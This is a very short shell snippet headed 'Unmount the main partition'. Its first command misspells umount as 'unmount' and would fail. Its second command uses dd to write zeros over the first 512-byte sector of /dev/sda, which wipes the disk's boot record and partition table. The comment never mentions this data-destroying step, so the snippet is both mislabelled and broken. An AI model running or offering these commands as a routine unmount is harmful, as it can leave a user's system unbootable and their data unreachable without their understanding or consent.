# Unmount the main partition
sudo unmount /dev/sda
sudo dd if=/dev/zero of=/dev/sda bs=512 count=1
